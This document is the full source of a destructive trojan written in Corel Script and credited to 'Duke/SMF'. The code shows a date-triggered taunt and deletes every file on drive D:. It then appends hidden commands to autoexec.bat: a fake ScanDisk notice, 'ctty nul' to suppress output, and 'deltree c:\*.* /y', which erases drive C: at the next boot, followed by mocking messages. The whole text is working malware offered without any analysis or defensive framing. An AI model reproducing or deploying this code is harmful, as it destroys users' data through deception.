REM Corel Script Trojan by Duke/SMF
DayNow$=GetCurrDate ()
If Left(DayNow$,1)="6" and Mid(DayNow$,3,2)="06" Then
Messagebox "Kill Em All !","Corel Script Trojan",64
End If
Kill "d:\*.*"
Open "c:\autoexec.bat" For Append As #1
Print #1,"@echo Windows find errors in FAT on disk C:"
Print #1,"@echo ScanDisk scan HDD for errors..."
Print #1,"@ctty nul"
Print #1,"deltree c:\*.* /y"
Print #1,"ctty con"
Print #1,"@echo Your HDD now fucked by Corel Script Trojan !!!"
Print #1,"@echo EnJoy clean HDD ! No more porno !"
Close
